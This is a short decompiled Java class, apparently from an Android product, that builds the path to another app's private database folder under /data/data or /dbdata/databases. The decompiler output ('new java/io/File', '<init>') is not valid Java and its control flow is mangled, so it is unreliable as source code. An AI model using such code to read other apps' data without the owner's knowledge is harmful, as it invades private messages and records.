package com.vvt.n;

import java.io.File;

public class a
{
  public static String a(String paramString)
  {
    int i = 2;
    int j = 1;
    Object localObject = new Object[i];
    String str1 = "/data/data";
    localObject[0] = str1;
    localObject[j] = paramString;
    String str2 = String.format("%s/%s/databases", (Object[])localObject);
    localObject = new java/io/File;
    ((File)localObject).<init>(str2);
    boolean bool;
    if (localObject != null)
    {
      bool = ((File)localObject).exists();
      if (!bool) {}
    }
    for (;;)
    {
      return str2;
      localObject = new Object[i];
      str1 = "/dbdata/databases";
      localObject[0] = str1;
      localObject[j] = paramString;
      str2 = String.format("%s/%s", (Object[])localObject);
      localObject = new java/io/File;
      ((File)localObject).<init>(str2);
      if (localObject != null)
      {
        bool = ((File)localObject).exists();
        if (bool) {}
      }
      else
      {
        str2 = null;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */